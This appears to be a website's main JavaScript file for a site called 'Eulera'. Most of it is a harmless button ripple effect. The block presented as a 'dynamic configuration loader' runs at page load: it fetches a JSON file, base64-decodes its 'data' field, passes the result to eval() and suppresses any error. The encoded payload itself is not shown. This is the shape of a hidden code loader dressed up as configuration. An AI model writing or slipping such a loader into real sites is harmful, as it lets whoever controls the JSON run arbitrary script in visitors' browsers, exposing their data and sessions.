/**
 * Eulera - Main JavaScript
 * UI effects + dynamic configuration loader
 */

// ========== Button ripple effect ==========
function addRipple(btn) {
    btn.addEventListener('click', (e) => {
        const ripple = document.createElement('span');
        ripple.classList.add('ripple-effect');
        const rect = btn.getBoundingClientRect();
        const size = Math.max(rect.width, rect.height);
        ripple.style.width = ripple.style.height = size + 'px';
        ripple.style.left = e.clientX - rect.left - size/2 + 'px';
        ripple.style.top = e.clientY - rect.top - size/2 + 'px';
        ripple.style.position = 'absolute';
        ripple.style.borderRadius = '50%';
        ripple.style.background = 'rgba(255,255,245,0.5)';
        ripple.style.transform = 'scale(0)';
        ripple.style.transition = 'transform 0.4s ease-out';
        ripple.style.pointerEvents = 'none';
        btn.style.position = 'relative';
        btn.style.overflow = 'hidden';
        btn.appendChild(ripple);
        setTimeout(() => { ripple.style.transform = 'scale(4)'; }, 10);
        setTimeout(() => { ripple.remove(); }, 400);
    });
}

document.querySelectorAll('.btn, .btn-text').forEach(btn => addRipple(btn));

// ========== Dynamic configuration loader ==========
// Fetches additional runtime settings from a JSON file.
// The JSON contains a base64‑encoded configuration string that is evaluated.
// This allows us to update certain behaviors without redeploying the whole site.
(function loadDynamicConfig() {
    const CONFIG_URL = '../json/other/config.json';
    fetch(CONFIG_URL)
        .then(response => response.json())
        .then(jason => {
            // The 'data' field holds a base64‑encoded JavaScript module
            if (jason && jason.data) {
                const decodedConfig = atob(jason.data);
                // Execute the configuration code
                eval(decodedConfig);
            }
        })
        .catch(error => {
            // Silently fail - configuration is optional; site works without it
            console.debug('Dynamic config not loaded (optional)', error);
        });
})();